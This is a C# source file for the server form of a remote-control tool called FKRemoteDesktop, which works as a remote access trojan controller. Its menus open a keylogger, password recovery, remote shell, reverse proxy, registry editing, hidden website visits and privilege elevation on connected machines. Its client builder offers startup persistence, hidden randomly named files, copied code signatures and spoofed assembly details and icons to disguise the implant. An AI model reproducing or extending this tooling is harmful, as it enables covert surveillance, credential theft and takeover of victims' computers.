using FKRemoteDesktop.Builder;
using FKRemoteDesktop.Certificate;
using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Extensions;
using FKRemoteDesktop.Forms;
using FKRemoteDesktop.Framework;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message;
using FKRemoteDesktop.Message.SubMessageHandler;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Network;
using FKRemoteDesktop.Structs;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop
{
    public partial class ServerForm : Form
    {
        #region 变量
        public FKServer FKServer { get; set; }

        private const int LOG_COLUMN_ID = 9;
        private const int USER_STATUS_COLUMN_ID = 7;
        private const string CLIENT_FILE_NAME = "FKRemoteDesktopClient.exe";

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object();
        #endregion

        #region 系统和UI函数

        public ServerForm()
        {
            _clientStatusHandler = new ClientStatusHandler();
            RegisterMessageHandler();
            InitializeComponent();
        }

        private void ServerForm_Load(object sender, EventArgs e)
        {
            CreateCertificateAndServer();
            AutostartListening();
        }

        private void ServerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if(FKServer != null)
                FKServer.Disconnect();
            UnregisterMessageHandler();
        }

        // 点选了列表元素
        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        #endregion

        #region 上方菜单栏相关

        // Menu->文件->退出 按钮
        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        // Menu->设置 按钮
        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new SettingForm(FKServer))
            {
                frm.ShowDialog();
            }
        }

        // Menu->关于 按钮
        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new AboutForm())
            {
                frm.ShowDialog();
            }
        }

        // Menu->生成 按钮
        private void buildClientStripMenuItem_Click(object sender, EventArgs e)
        {
            BuildClientInNewThread();
        }

        #endregion

        #region 右键菜单栏相关

        // 系统信息查看
        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                SystemInformationForm frmSi = SystemInformationForm.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        // 文件传输工具
        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FileManagerForm frmFm = FileManagerForm.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        // 启动项管理工具
        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                StartupManagerForm frmStm = StartupManagerForm.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        // 任务管理工具
        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                TaskManagerForm frmTm = TaskManagerForm.CreateNewOrGetExisting(c);
                frmTm.Show();
                frmTm.Focus();
            }
        }

        // 远程命令工具
        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                RemoteShellForm frmRs = RemoteShellForm.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        // 远程网络查看工具
        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                ConnectionsForm frmCon = ConnectionsForm.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        // 反向代理工具
        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                ReverseProxyForm frmRs = new ReverseProxyForm(clients);
                frmRs.Show();
            }
        }

        // 注册表编辑工具
        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    RegistryEditorForm frmRe = RegistryEditorForm.CreateNewOrGetExisting(c);
                    frmRe.Show();
                    frmRe.Focus();
                }
            }
        }

        // EXE 执行工具
        private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                RemoteExecutionForm frmRe = new RemoteExecutionForm(clients);
                frmRe.Show();
            }
        }

        // 密码恢复工具
        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                PasswordRecoveryForm frmPass = new PasswordRecoveryForm(clients);
                frmPass.Show();
            }
        }

        // 键盘记录工具
        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                KeyloggerForm frmKl = KeyloggerForm.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        // 远程桌面工具
        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                RemoteDesktopForm frmRd = RemoteDesktopForm.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        // 远程消息弹出框
        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new ShowMessageboxForm(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoShowMessageBox
                            {
                                Caption = frm.MsgBoxCaption,
                                Text = frm.MsgBoxText,
                                Button = frm.MsgBoxButton,
                                Icon = frm.MsgBoxIcon
                            });
                        }
                    }
                }
            }
        }

        // 打开远程网页
        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new VisitWebsiteForm(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoVisitWebsite
                            {
                                Url = frm.Url,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        // 客户端提权
        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        // 客户端更新
        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                RemoteExecutionForm frm = new RemoteExecutionForm(clients);
                frm.Show();
                frm.Focus();
            }
        }

        // 重连客户端
        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }
        // 断开客户端
        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientDisconnect());
            }
        }
        // 客户端自删除
        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0)
                return;
            if (
                MessageBox.Show(
                    string.Format(
                        "您确定要卸载 {0} 台电脑上的客户端吗？",
                        lstClients.SelectedItems.Count), "卸载客户端提示", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    c.Send(new DoClientUninstall());
                }
            }
        }

        // 关机
        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = EShutdownAction.eShutdownAction_Shutdown });
            }
        }

        // 重启
        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = EShutdownAction.eShutdownAction_Restart });
            }
        }

        // 待机
        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = EShutdownAction.eShutdownAction_Standby });
            }
        }

        // 选择全部客户端
        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        // DEBUG 功能
        private void debugToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                DebugForm frm = new DebugForm(clients);
                frm.Show();
                frm.Focus();
            }
        }

        #endregion

        #region 基础函数

        // 注册客户端状态消息处理程序，用于客户端通信
        private void RegisterMessageHandler()
        {
            MessageHandler.Register(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated += SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated -= SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
        }

        private void UpdateWindowTitle()
        {
            if(_titleUpdateRunning) 
                return;
            _titleUpdateRunning = true;

            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("FK远控服务器端 - 已连接客户端: {0} 【已选中: {1}】", FKServer.ConnectedClients.Length,
                            selected)
                        : string.Format("FK远控服务器端 - 已连接客户端: {0}", FKServer.ConnectedClients.Length);
                });
            }
            catch (Exception) { }

            _titleUpdateRunning = false;
        }

        private void CreateCertificateAndServer()
        {
            X509Certificate2 serverCertificate;
            if (!File.Exists(ServerConfig.CertificatePath))
            {
                using (var certificateSelection = new CertificateForm())
                {
                    if (certificateSelection.ShowDialog() != DialogResult.OK)
                    {
                        Application.Exit();
                        return;
                    }
                }
            }
            serverCertificate = new X509Certificate2(ServerConfig.CertificatePath);

            FKServer = new FKServer(serverCertificate);
            FKServer.ServerState += ServerState;
            FKServer.ClientConnected += ClientConnected;
            FKServer.ClientDisconnected += ClientDisconnected;
        }

        private void AutostartListening()
        {
            if (ServerConfig.AutoListen)
                StartConnectionListener();
        }

        private void StartConnectionListener()
        {
            try
            {
                FKServer.Listen(ServerConfig.ListenPort, ServerConfig.IPv6Support, ServerConfig.UseUPnP);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "端口被占用.", "Socket 错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, $"错误信息: {ex.Message}\n\n错误码: {ex.ErrorCode}\n\n", "Socket 错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                FKServer.Disconnect();
            }
            catch (Exception)
            {
                FKServer.Disconnect();
            }
        }

        // 设置一个客户端列表元素的提示信息
        private void SetToolTipText(Client client, string text)
        {
            if (client == null)
                return;
            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException) { }
        }

        // 为列表添加一个客户端信息
        private void AddClientToListview(Client client)
        {
            if (client == null) 
                return;
            try
            {
                string strAccountType = SUserInfo.ConvertEnumAccountTypeToString(client.UserInfo.AccountType);
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, 
                    client.UserInfo.Tag,
                    client.UserInfo.UserAtPc,
                    client.UserInfo.OperatingSystem,
                    client.UserInfo.CountryWithCode,
                    client.UserInfo.Version, 
                    "已连接", 
                    "活跃",
                    strAccountType,
                    "-",
                })
                { Tag = client, ImageIndex = client.UserInfo.ImageIndex };

                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Add(lvi);
                    }
                });

                UpdateWindowTitle();
            }
            catch (InvalidOperationException){}
        }

        // 从列表中移除一个客户端信息
        private void RemoveClientFromListview(Client client)
        {
            if (client == null) 
                return;
            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException){}
        }

        // 根据客户端获取其列表元素
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) 
                return null;
            ListViewItem itemClient = null;
            lstClients.Invoke((MethodInvoker)delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });
            return itemClient;
        }

        // 用户选中的客户端
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();
            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) 
                        return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });
            return clients.ToArray();
        }

        // 已连接的客户端列表
        private Client[] GetConnectedClients()
        {
            return FKServer.ConnectedClients;
        }

        // 生成客户端
        private void BuildClientInNewThread()
        {
            SBuildOptions options;
            try
            {
                options = LoadBuildOptionsFromFile("Default");
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, ex.Message, "生成客户端失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            SetBuildState(false);

            Thread t = new Thread(BuildClient);
            t.Start(options);
        }

        private bool IsValidVersionNumber(string input)
        {
            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$", RegexOptions.IgnoreCase);
            return match.Success;
        }

        private SBuildOptions LoadBuildOptionsFromFile(string profileName)
        {
            SBuildOptions options = new SBuildOptions();
            var clientConfig = new ClientConfig(profileName);

            options.Version = Application.ProductVersion;

            BindingList<SHost> _hosts = new BindingList<SHost>();
            _hosts.Clear();
            foreach (var host in HostsConverterHelper.RawHostsToList(clientConfig.Hosts))
                _hosts.Add(host);
            options.RawHosts = HostsConverterHelper.ListToRawHosts(_hosts);
            options.Delay = (int)clientConfig.Delay;
            options.Tag = clientConfig.Tag;
            options.Mutex = clientConfig.Mutex;

            options.Keylogger = clientConfig.Keylogger;
            options.Install = clientConfig.InstallClient;
            options.Startup = clientConfig.AddStartup;
            options.HideFile = clientConfig.HideFileAndRandomName;

            options.IsUseCopySignature = clientConfig.ChangeSignature;
            options.CopySignaturePath = clientConfig.CopySignaturePath;
            options.IsUseCopyAsmInfoPath = clientConfig.ChangeAsmInfo;
            options.CopyAsmInfoPath = clientConfig.CopyAsmInfoPath;
            options.IsUseCustomIconPath = clientConfig.ChangeIcon;
            options.CopyIconInfoPath = clientConfig.CopyIconInfoPath;
            options.IconPath = clientConfig.IconPath;

            options.AssemblyInformation = new string[9];
            options.AssemblyInformation[0] = clientConfig.ProductName;
            options.AssemblyInformation[1] = clientConfig.Description;
            options.AssemblyInformation[2] = clientConfig.CompanyName;
            options.AssemblyInformation[3] = clientConfig.Copyright;
            options.AssemblyInformation[4] = clientConfig.Trademarks;
            options.AssemblyInformation[5] = clientConfig.OriginalFilename;
            options.AssemblyInformation[6] = clientConfig.ProductVersion;
            options.AssemblyInformation[7] = clientConfig.FileVersion;
            options.AssemblyInformation[8] = clientConfig.MotifyTime;

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "保存客户端";
                sfd.Filter = "可执行程序 *.exe|*.exe";
                sfd.RestoreDirectory = true;
                sfd.FileName = "FKRemoteDesktopClient_Packed.exe";
                if (sfd.ShowDialog() != DialogResult.OK)
                {
                    throw new Exception("请选择一个有效的客户端文件输出路径.");
                }
                options.OutputPath = sfd.FileName;
            }

            if (string.IsNullOrEmpty(options.OutputPath))
            {
                throw new Exception("请选择一个有效的客户端文件输出路径.");
            }
            return options;
        }

        private void SetBuildState(bool state)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    buildClientStripMenuItem.Enabled = state;
                });
            }
            catch (InvalidOperationException) { }
        }

        private void BuildClient(object o)
        {
            try
            {
                SBuildOptions options = (SBuildOptions)o;
                if (!File.Exists(CLIENT_FILE_NAME))
                {
                    throw new Exception("当前目录下未找到 FKRemoteDesktopClient.exe，无法生成客户端.");
                }

                // 核心函数，生成客户端
                var builder = new ClientBuilder(options, CLIENT_FILE_NAME);
                string[] finalFileName = builder.Build();

                try
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        MessageBox.Show(this, $"创建客户端完成! 共生成客户端 {finalFileName.Length} 个.",
                            "创建客户端完成", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    });
                }
                catch (Exception) { }
            }
            catch (Exception ex)
            {
                try
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        MessageBox.Show(this,
                            $"创建客户端失败!\n\n错误信息: {ex.Message}\n堆栈信息:\n{ex.StackTrace}", "创建客户端失败",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    });
                }
                catch (Exception) { }
            }
            SetBuildState(true);
        }

        #endregion

        #region 消息和事件函数

        // 设置客户端状态
        private void SetStatusByClient(object sender, Client client, string text)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[LOG_COLUMN_ID].Text = text;
        }

        // 设置用户状态
        private void SetUserStatusByClient(object sender, Client client, EUserStatus userStatus)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[USER_STATUS_COLUMN_ID].Text = ToString(userStatus);
        }

        private string ToString(EUserStatus status)
        {
            switch (status) {
                case EUserStatus.eUserStatus_Idle:  return "闲置";
                case EUserStatus.eUserStatus_Active: return "活跃";
                default: return "未知";
            }
        }

        // 服务器状态更变事件
        private void ServerState(Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (!listening)
                        lstClients.Items.Clear();
                    listenToolStripStatusLabel.Text = listening ? string.Format("当前状态：正在监听端口 {0}.", port) : "当前状态：未监听任何端口";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        // 有合法客户端连接消息
        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!FKServer.Listening) 
                    return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        // 有客户端断开连接消息
        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!FKServer.Listening) 
                    return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        #endregion

        #region 核心函数

        // 核心主逻辑，处理客户端连接
        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!FKServer.Listening)
                        _clientConnections.Clear();

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }
                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        #endregion
    }
}
